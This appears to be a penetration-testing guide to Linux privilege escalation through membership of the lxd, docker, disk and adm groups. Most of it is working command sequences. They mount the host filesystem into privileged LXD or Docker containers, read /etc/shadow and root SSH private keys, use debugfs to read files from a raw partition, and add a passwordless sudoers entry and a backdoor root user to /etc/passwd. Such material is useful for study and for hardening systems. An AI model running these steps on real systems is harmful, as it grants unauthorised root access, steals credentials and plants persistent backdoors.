## Privileged Group Abuse

Certain Linux group memberships grant capabilities that are functionally equivalent to root access, even though the user has no direct root privileges. The most dangerous are `lxd`, `docker`, and `disk`. Always check group membership with `id` immediately after gaining access. 

***

## LXD / LXC Group

LXD is Ubuntu's container manager. Any member of the `lxd` group can create privileged containers and mount the host filesystem inside them, giving effective root access to every file on the system.  This has been a known issue since 2016 and the LXD documentation now explicitly warns that the `lxd` group should only be assigned to users trusted with root access. 

### Step-by-Step Exploitation

**On your attack machine**, build the Alpine image (do this before transferring):

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
# Produces alpine-v3.xx-x86_64-<date>.tar.gz
```

**Transfer the image to the target** and run the following:

**1. Confirm group membership:**

```bash
id
# uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

**2. Import the Alpine image:**

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc image list    # Confirm it imported
```

**3. Create a privileged container:**

```bash
lxc init alpine r00t -c security.privileged=true
```

The `security.privileged=true` flag disables UID mapping, meaning root inside the container (UID 0) directly maps to root on the host. 

**4. Mount the entire host filesystem into the container:**

```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

**5. Start the container and spawn a shell:**

```bash
lxc start r00t
lxc exec r00t /bin/sh
```

**6. Access the host filesystem as root:**

```bash
id
# uid=0(root) gid=0(root)

cd /mnt/root/root
cat /mnt/root/etc/shadow           # All password hashes
cat /mnt/root/root/.ssh/id_rsa     # Root SSH private key

# Add yourself to sudoers permanently
echo "devops ALL=(ALL) NOPASSWD: ALL" >> /mnt/root/etc/sudoers

# Or add a root user directly
echo 'hacker:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd
```

***

## Docker Group

Docker group membership is effectively equivalent to root on the file system. Members can create containers with the host filesystem mounted as a volume. 

```bash
# Confirm group membership
id | grep docker

# Mount host root directory and get an interactive shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or mount only sensitive directories
docker run -v /root:/mnt -it ubuntu bash
# Browse /mnt for SSH keys, then:
cat /mnt/.ssh/id_rsa

# Mount /etc to read shadow or write a new root user
docker run -v /etc:/mnt -it ubuntu bash
cat /mnt/shadow
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /mnt/passwd
```

Once you have written a new root user to `/etc/passwd` via the mounted container volume, the change takes effect immediately on the host and you can `su hacker` to get a root shell. 

***

## Disk Group

The `disk` group grants read (and sometimes write) access to all block devices under `/dev`, including `/dev/sda1` or whatever partition hosts the root filesystem.  The `debugfs` utility, an interactive filesystem debugger, can be used to read arbitrary files from the device. 

```bash
# Identify the root partition
df -h
# /dev/sda3 -> /

# Open the partition with debugfs
debugfs /dev/sda3

# Inside debugfs:
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa     # Read root's private SSH key
debugfs: cat /etc/shadow           # Read password hashes
```

Write operations via `debugfs` are possible with the `-w` flag but will fail on root-owned files due to permission checks at the filesystem level. The primary use case is reading sensitive files that would otherwise require root access. 

***

## ADM Group

The `adm` group provides read access to all log files in `/var/log`. This does not grant direct root access but is valuable for passive intelligence gathering. 

```bash
# Confirm membership
id | grep adm
# groups=1010(secaudit),4(adm)

# What is available to read?
ls /var/log/
cat /var/log/auth.log          # Authentication events, sudo usage, su attempts
cat /var/log/syslog            # General system activity
cat /var/log/apache2/access.log  # Web server requests
grep "sudo" /var/log/auth.log  # All sudo activity by all users
grep "password" /var/log/auth.log
grep "session opened" /var/log/auth.log  # Login sessions
```

What the `adm` group reveals: 
- Which users are logging in and from what IP addresses
- Which commands are being run with sudo, and when
- Cron job execution logs (timing helps confirm if a cron job is exploitable)
- Application logs that may contain credentials in error messages or debug output
- Failed login attempts that hint at credential patterns

***

## Group Risk Summary

| Group | Direct Root? | Primary Abuse Method |
|---|---|---|
| `lxd` | Yes | Mount host `/` into privileged container |
| `docker` | Yes | Mount host filesystem, write to `/etc/passwd` |
| `disk` | Read-only root | `debugfs` to read SSH keys and `/etc/shadow` |
| `sudo` | Yes (with password) | `sudo su` or binary-specific GTFOBins |
| `adm` | No | Read logs for credentials and cron timing |
